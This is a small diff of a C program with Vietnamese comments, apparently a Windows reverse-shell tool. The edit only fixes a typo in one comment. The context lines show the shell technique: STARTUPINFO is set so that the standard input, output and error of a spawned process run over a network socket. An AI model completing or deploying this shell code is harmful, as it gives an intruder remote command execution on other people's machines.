@@ -26,7 +26,7 @@ int main(){
     STARTUPINFO si = {sizeof(si)};
     PROCESS_INFORMATION pi;
 
-    // su sung startup info de redirect std sang luong socket
+    // su dung startup info de redirect std sang luong socket
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESTDHANDLES;
     si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock; // socket co the ep kieu thanh handle trong 1 so truong hop su dung de nhan redirect stdin, stdout, stderr tu 1 process
